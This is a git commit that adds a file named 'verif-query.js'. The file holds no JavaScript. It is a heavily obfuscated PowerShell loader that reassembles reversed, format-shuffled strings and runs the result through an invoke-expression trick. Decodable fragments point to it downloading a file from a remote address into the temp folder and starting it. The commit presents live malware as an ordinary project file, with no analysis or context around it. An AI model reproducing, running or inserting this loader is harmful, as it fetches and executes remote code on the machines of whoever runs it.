795f5b233d68e6d6b47edccb3d8b28daed68943c
Azkic50 <Azkilohj55@gmail.com>
2025-04-08 20:54:15 -0400

    Create verif-query.js

---
+++ verif-query.js
@@ -0,0 +1,22 @@
+&((gv '*MDr*').nAme[3,11,2]-jOiN'')([strIng]::jOIn( '',( [rEGEX]::mAtchEs("))43]rAHC[,'k1r'  EcaLPeRc-63]rAHC[,'xJG' EcaLPeRc-  93]rAHC[,'zcT'  EcaLPeRc-  )') )69]RAhc[]gnIRTS[,zcT9yVzcT(eCalPER.)421]R'+'Ahc[]gnIRTS[,zcTsctzcT(eCalPER.)zcTxJGzcT,zcT1RKzcT(eCalPER.)93]RAhc[]gnIRTS[,)89]RAhc[+68]RAhc[+101]RAh'+'c['+'((eCalPER.))zcTbVe= )'+'SJbV'+'e+'+'bVe3bbVe+bVeSJbVe+bVe3bVe+bVe( ;bVe+bVe)'+'bVe+bVeSbVe+bVeJ3.SJ3,SJ3ibVe+bVeSJ3bVe+bVe,bVe+bVeSJ3bVe+bVeubVe+bVeSbVe+bVeJ3,bV'+'e+bVeSJ3bVe+bVeXJCQ/mobVe+bVec.tbVe+bVei.bVe+bVekrSz'+'cT,zcThtSbVe+bVeJbVe+bVe'+'3,SJ3MSbVe+bVeJ'+'bVe+bVe3bVe+bVe,zcT,zcT+bVz'+'cT,zcTbVe75olbVe+bVeNWo'+'P7bVe+bVe5D{jWsbVe+b'+'Ve   bVe+bVe   bVe+b'+'Ve  
+{ bVe+bVe)}bVe+b'+'VeHTapP75EbVe+bVelbVe+'+'bVeP75IP7bVe+'+'bVe5bVe+bVeF{jWs )SbVe+bVeJbVe+bV'+'e3bVe+bVehtbVe+'+'b'+'zcT,zcTe+bVeerobzcT,zcTe+bVe1{wvk(. zcT,zcT}bVe+bVe2{}4{}1{bVe+bVe}zcT,zcT)bVexb'+'Ve+]03[emoHSp1RK+]'+'4[emoHsp1RzcT'+',zcT'+'   
+ }bVe+b'+'Ve   bVe+bVe   
+;bVe+bVe}eslAbVe+bVeP7bVe+bVe5bVe'+'+bVef{jWs bVe+bVe= }bVezcT,zcTe+bVeatSSz'+'cT,zcT{wzcT,zcTER.)63]raHC[]gnirTs[,)601]raHC['+'+78]raHzcT,zcTePbVe+bVe75OLNbVe+bVeP75wod{jbV'+'e+bVeWbVe+bVes    bVe+bVe  
+;wvbVe+b'+'Vek)bVe+bVeb.ijWs(jbVe+bVeWbVe+bVesEsVbVzcT,zcTe=bVe+bVe )SJ'+'3bVe+bVeaSJbVe+bVe3bVe+bVe(bVe+bVe{bVe+bVe@]tcejbVe+'+'bVebOmotsubVe+bVzc'+'T,zcTVe,SJ3-tbVe+bVezcT,zcT5F{jWsbVe+bVe bVe+bVe)bVe'+'+b'+'VeSbVe+bVeJ3bVe+bVesseSJ3,SJ3-tbVe+bVerbVz'+'cT,zcTVe+bVe'+'f  bVe+bVe
+bVe+bVe;)
+}bVe+bVe)SbVe+bVeJ3smbVe+bVe.bVe+bVeDUDNXJCSJ3,SJ3bVe+bVeQSJ'+'3bVe+bVe,bVe+bVeSJ3iSJbVe+bVe3 f-bVe+bVe bVe+bVewvk}0{}2bVe+bVe{}1{wbVe+bVevk( bVe+zcT'+',zcTeobVe+bVez'+'cT,zcTe'+'75bVe+bVelibVe+bVefbVe+bVe{jbVe+b'+'VeWzcT,'+'zcTbVe75f{'+'jWs bVzcT,zcT[((eCAlPER.)bVe9yVbVe,bVeP75bVe(eCAlPzcT,zcTVe 
+{ zcT,zcTseTSJ3 z'+'cT,zcTVeSJ3,SJbVe+bVe3bVe+bVeaPSJ3bVe+bzcT'+',zcT  bVe+bzcT,zcTR.)29]raHC[]gnirTs[,)96]raHC[+511]r'+'aHC[+68]raHC[zcT,zcT'+'Ve  
+
+}  
+bVe+bV'+'e}bVe+bVe zcT,zcTK ( &sct)43]raHC[]gnirTs[,)911]raHC[+811]raH'+'C[+701]raHCzcT,zcTeJ3eS'+'JbVe+bVe3,SJbVe+bVe3tbVe+bVesbVe+b'+'VeebVe+bVe'+'R-bVe+bVeebVe+bVekSbVe+bVeJ3bVe+bVe,bVe'+'+bVeSbVe+bVeJbVe+bVe3ovnIbVe+bVeSJbVe+b'+'Ve3f-wvkbVe+bVe}3{}5{zcT,zcTbVeabVzcT,zcT'+'eP75bVe+bVeObVe+bVeD{jWsbVe+bVe( fbVe+bVei  bVe+bVe bVe+bVezcT,zcTbVe+bVehctac  bVe+zcT,zcTSJ3dSJ3bVe+bVe,SbVe+bVzcT,zcTvk(&bVe+bV'+'e( fibVe+bVe '+'bVe+bVe  bVe+bVe bVe+bVe  bVe+bVe
+b'+'Ve+bVe;zcT,zcTe  bVe+bVe  bVe+bVe   
+{ bVe+bVe'+')}dAOzc'+'T,'+'zcTs eliFbVe+bVetuO-'+' wvkbVe+bVeAbVe+bV'+'ew'+'vk.bVe+bVe}bVezcT,zcTbVzcT,zc'+'T('+'(eCAlPER.)'+'bzcT,zcT}eUPbVe+b'+'Ve75rbVe+bVetbVe+bVe'+'{jWs = }dbVe+bVeAbVe+zcT,zcT bzcT,zcTf- wvkbVe+bVe}2bVe+bVe'+'{}bV'+'e+'+'bVe1bVe+bV'+'e{}0zcT,zc'+'T+bVeI{'+'jWs bVe+bVeirU- bVezcT,zcTe'+'+bVePMET:vnbVe+bVeejWbVe+bVeswbVe'+'+bVevkbVe+'+'bVe = b'+'Ve+bVe}HbVe+bVeTPbVe+bVe7bVe+bVe5APbVe+bVeEP75LIPbVe+zcT,zcTC[+511]raHC[((eCAlPER.)93]raHC[]gnirT'+'s[,bVeSJ3bVe(eCAlPEzcT,zcTbVe  
+}    
+;bVe+bVe}HbVe+bVetapeP75LiP7zcT,zcTlP75NbVe+bVeP75wbVe+bVzcT,zcT+bVeOPbVe+bVe75S{jWs ni bVe+bVe}bVe+'+'bVeI'+'{jWsbVe+bVe'+'( hbVe+bVecbVe+zcT,zcTe'+'CSP[  bVe+bVe
+(bVe+bVe@ bVe+bVe= }bVe+bVeATAP7bVe+bVe5dbVe+bVeembVe+bVeoP75bVe+bVeS{jWsbVe+bVe  bVe+bVe
+bVe+bVe
+bVe(zcT,zcTbVe+bVe0{wbVe+bVevk(& bVe+bVzcT,zcT+bVe)SJbVe+bVe3bVezc'+'T,zcTJ3'+',SJbVe+bVe3corbVe+bVePbVe+bVeSbVe+bVeJ3f-wvk}2{}0{}bVzcT,zcTspb'+'Ve+bVe'+'tthSJbVe+bVe3,SbVe+bVeJbVe+bVe3smSb'+'Ve+bVeJ'+'3f- w'+'bVe+bV'+'evk}5bVe+bVe{}bVe+bVe0{}6{}2'+'bVe+bVe{bV'+'e+bVe}3{}4bVe+bVe{}1bVe+bVe{bVe+bVewvk( bVe+bVzcT,zcTe+bVe     
+{bVe+bVe ybVe+bVert    bVe+bVe
+{bVe+bV'+'e )}abVe+bVetAdbzcT,zcTVe+bVe  bVe+bVe  
+bVe+bVe} bVe+bVe   bVe+bVe bVe+bVe 
+ ;bVe+bVe}hTbVe+bVeaPPbVe+bVe75ebVe+bVePbVe+'+'bVzcT,zcTJ3,bVe+bVeSJ3bVe+bVeDUDNSJbVe+bVe3,bVe+bVeS'+'JbVe+bVe3kbVe+bVeubVe+bVecal//'+':zcT,zcT+bVedbVe+bVeAPbVe+zcT,zcTVe+bVeebVe+bVeMPbVe+bVe75bVezcTf- k1r}94{}92{}63{}54{}31{}13{}91{}03{}23{}53{}5'+'2{}21{}14{}'+'74{}6{}15{}71{}3{}83{}12{}51{}7{}45{}93{}55{}42{}82{}0'+'5{}8{}22{}'+'1'+'1{}62{}84{}1{}35{}33{}24{}43{}61{}64{}32{}81{}02{}'+'44{}41{}73{}4{}0{'+'}01{}72{}25{}04{'+'}65{}2{}5{}34{}9{k1r((( Xei '((( )''NIOJ-]52,51,4[cePSMOC:vNe$ (& ", '.','RIgh'+'TTOLe'+'f'+'t') | % { $_.vaLUE }) ))
